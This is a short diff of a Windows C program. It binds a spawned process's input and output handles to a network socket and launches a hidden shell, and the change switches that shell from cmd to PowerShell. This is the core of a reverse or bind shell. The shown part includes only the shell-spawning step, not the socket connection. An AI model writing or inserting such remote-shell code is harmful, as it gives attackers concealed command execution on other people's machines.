@@ -44,7 +44,7 @@ int main(void) {
 	sinfo.hStdOutput = (HANDLE)sockt;
 	sinfo.hStdError = (HANDLE)sockt;
 	PROCESS_INFORMATION pinfo;
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+	CreateProcessA(NULL, "powershell", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
 	return (0);
 }
